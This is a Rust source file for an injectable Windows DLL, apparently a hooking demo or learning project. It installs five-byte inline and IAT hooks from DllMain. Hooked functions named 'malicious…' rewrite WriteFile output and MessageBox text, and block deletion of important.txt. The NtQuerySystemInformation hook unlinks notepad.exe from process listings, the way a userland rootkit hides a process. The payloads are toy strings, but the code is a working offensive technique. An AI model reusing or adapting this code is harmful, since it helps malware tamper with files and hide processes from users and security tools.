
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAlloc, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::minwinbase::OVERLAPPED;
use winapi::um::processthreadsapi::*;
use winapi::um::winnt::*;
use winapi::um::synchapi::*;
use winapi::ctypes::*;
use utils::parse_structure_from_memory;
use ntapi::ntpsapi::*;
use ntapi::ntexapi::*;
use ntapi::ntmmapi::*;
use crate::peparser::Peparser64;
use crate::utils::ReadStringFromMemory;
use winapi::um::winnt::*;
use winapi::shared::minwindef::*;
use winapi::um::libloaderapi::*;
use ntapi::ntpebteb::*;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winuser::*;
use winapi::um::synchapi::*;


use winapi::um::securitybaseapi::*;

use winapi::um::winnt::*;
use winapi::ctypes::*;
use winapi::shared::minwindef::*;
use winapi::shared::ntdef::NTSTATUS;
use winapi::shared::ntstatus::*;
use winapi::um::errhandlingapi::*;
use winapi::um::handleapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use winapi::um::winbase::*;


mod utils;
use utils::*;
mod peparser;

mod fivebyteshooking;
mod iathooking;



use std::sync::Mutex;
use once_cell::sync::Lazy;
static mut hook1:Lazy<Mutex<fivebyteshooking::fivebytehook>> = Lazy::new(||{
    Mutex::new(crate::fivebyteshooking::fivebytehook::new("kernel32.dll".to_string(), "WriteFile".to_string(), maliciouswritefile as usize))
});


static mut hook2:Lazy<Mutex<iathooking::iathook>> = Lazy::new(||{
    Mutex::new(crate::iathooking::iathook::new("ntdll.dll".to_string(),
     "NtQuerySystemInformation".to_string(), myquerysysinfo as usize))
});



#[no_mangle]
pub unsafe extern "stdcall" fn maliciousmsgbox(hWnd: *mut c_void,
    lpText: LPCSTR,
    lpCaption: LPCSTR,
    uType: UINT) -> i32{
    

        let text = crate::utils::ReadStringFromMemory(unsafe{GetCurrentProcess()}, lpText as *const c_void);

        println!("original text: {}",text);


        let modifiedtext = "HACKED LOLZ\0";

        hook1.lock().unwrap().uninstall_hook();
        

        let runner = std::mem::transmute::<usize,
        fn(*mut c_void, LPCSTR,LPCSTR, u32)->i32>(hook1.lock().unwrap().getogaddr());


        return runner(hWnd,modifiedtext.as_bytes().as_ptr() as *const i8,lpCaption,uType);

}




#[no_mangle]
pub unsafe extern "stdcall" fn maliciouswritefile( hFile: HANDLE,
    lpBuffer: LPCVOID,
    nNumberOfBytesToWrite: DWORD,
    lpNumberOfBytesWritten: LPDWORD,
    lpOverlapped: *mut OVERLAPPED) -> i32{



        let text = crate::utils::ReadStringFromMemory(unsafe{GetCurrentProcess()}, lpBuffer as *const c_void);

        //println!("original text to writefile: {}",text);

        hook1.lock().unwrap().uninstall_hook();
        
       

        let modified = "THISISMALICIOUSMESSAGE-FROM-5BYTE-HOOKING\0".bytes().collect::<Vec<u8>>();

        let mut byteswritten = 0;

        let runner = std::mem::transmute::<usize,
        fn(HANDLE,LPCVOID,DWORD,LPDWORD,*mut OVERLAPPED)->i32>(hook1.lock().unwrap().getogaddr());


        return runner(hFile,
            modified.as_ptr() as *const c_void,
                             modified.len() as u32,
                             &mut byteswritten,std::ptr::null_mut() );
    



}




#[no_mangle]
pub unsafe extern "stdcall" fn maliciousdeletefile( filename: LPCSTR) -> i32{



        let text = crate::utils::ReadStringFromMemory(unsafe{GetCurrentProcess()}, filename as *const c_void);

        //println!("original text to deletefile: {}",text);

        hook2.lock().unwrap().uninstall_hook();
        
        if text.to_lowercase().contains("important.txt"){
            return 2i32;
        }
        else{

            let runner = std::mem::transmute::<
            usize,fn(LPCSTR) -> i32>(hook2.lock().unwrap().getogaddr());

            return runner(filename);
        }

        
      
    



}





#[no_mangle]
pub fn hook(){



    /*let dllhandle = unsafe{LoadLibraryA("kernel32.dll\0".as_bytes().as_ptr() as *const i8)};

    unsafe{ ogaddr = GetProcAddress(dllhandle,"WriteFile\0".as_bytes().as_ptr() as *const i8) as usize};

    let offset = unsafe{ (maliciouswritefile as usize) - (ogaddr as usize + 5)};
    

    let mut bytesread = 0;
    unsafe{ReadProcessMemory(GetCurrentProcess(), 
        ogaddr as *const c_void, 
        ogbytes.as_mut_ptr() as *mut c_void, 
        5, &mut bytesread )};


    let mut jmp:Vec<u8> = vec![0;5];
    let mut byteswritten = 0;
    jmp[0] = 0xe9; // 0xe9 for jmp
    unsafe{WriteProcessMemory(GetCurrentProcess(),
                       (jmp.as_mut_ptr() as usize + 1) as *mut c_void,
                       offset.to_ne_bytes().as_ptr() as *const c_void,
                       4, &mut byteswritten )};

   

    let mut oldprotect= 0;
    //unsafe{VirtualProtect(GetCurrentProcess(),5,PAGE_EXECUTE_READWRITE,&mut oldprotect)};

    unsafe{WriteProcessMemory(GetCurrentProcess(),
    ogaddr as *mut c_void,jmp.as_ptr() as *const c_void,jmp.len(),std::ptr::null_mut())};
    */


}




#[no_mangle]
pub unsafe extern "C" fn myquerysysinfo(
    SystemInformationClass: SYSTEM_INFORMATION_CLASS,
    SystemInformationBuffer: PVOID,
    SystemInformationLength: u32,
    ReturnLength: *mut u32
) -> NTSTATUS{
    unsafe{

        hook2.lock().unwrap().uninstall_hook();


        let myquery = std::mem::transmute::<usize,
            fn(  SYSTEM_INFORMATION_CLASS,
                 PVOID,
                 u32,
                 *mut u32) -> NTSTATUS
        >(hook2.lock().unwrap().getogaddr());
        //println!("sysinfoclass: {}",SystemInformationClass);

        if SystemInformationClass!=5{
            return myquery(SystemInformationClass, SystemInformationBuffer, SystemInformationLength, ReturnLength);
        }

        let ntstatus = myquery(SystemInformationClass, SystemInformationBuffer, SystemInformationLength, ReturnLength);
        if ntstatus!=STATUS_SUCCESS{
            return ntstatus;
        }

        // if ntstatus is success then that means buffer is allocated with process information structures
        let mut firstinfo = SystemInformationBuffer as usize;


        'outerloop: loop{

            let procinfo = parse_structure_from_memory::<SYSTEM_PROCESS_INFORMATION>(GetCurrentProcess(), firstinfo as usize).unwrap();

            if procinfo.NextEntryOffset == 0{
                break;
            }


            let procname =  readunicodestringfrommemory(unsafe{GetCurrentProcess()},procinfo.ImageName.Buffer as *const c_void);
            //println!("processname: {}",procname);


            let mut offset = procinfo.NextEntryOffset as usize;
            'innerloop: loop{
                let nextprocinfo = parse_structure_from_memory::<SYSTEM_PROCESS_INFORMATION>(unsafe{GetCurrentProcess()}, (firstinfo+offset) as *const c_void as usize).unwrap();


                let nextprocname =  readunicodestringfrommemory(unsafe{GetCurrentProcess()},nextprocinfo.ImageName.Buffer as *const c_void);

                //let nextprocname = unicodetostring(&nextprocinfo.ImageName, GetCurrentProcess()).trim_end_matches("\0").to_string();
                if nextprocname.to_lowercase() !="notepad.exe"{
                    break 'innerloop;
                }

                offset +=  nextprocinfo.NextEntryOffset as usize;


            }

            if offset!=procinfo.NextEntryOffset as usize{

                let mut oldprotect = 0;
                VirtualProtect(firstinfo as *mut c_void,
                               4, 0x40, &mut oldprotect);

                let mut byteswritten = 0;
                WriteProcessMemory(GetCurrentProcess(),
                                   firstinfo as *mut c_void,
                                   offset.to_ne_bytes().as_ptr() as *const c_void,
                                   4, &mut byteswritten);
            }


            firstinfo += offset

        }


        /*WriteProcessMemory(GetCurrentProcess(),
        firstthunk as *mut c_void,
        (maliciousmsgboxaddr) as *const c_void,
        8,
        &mut byteswritten);*/

        return ntstatus;


    }
}




#[no_mangle]
pub unsafe extern "stdcall" fn DllMain(
    hinstance: HINSTANCE,
    reason: u32,
    reserved: *mut c_void
) -> bool{

    match reason{
        DLL_PROCESS_ATTACH=>{
            hook2.lock().unwrap().install_hook();

        },
        DLL_THREAD_ATTACH=>{

        },
        _ => ()
    }

    return true;

}


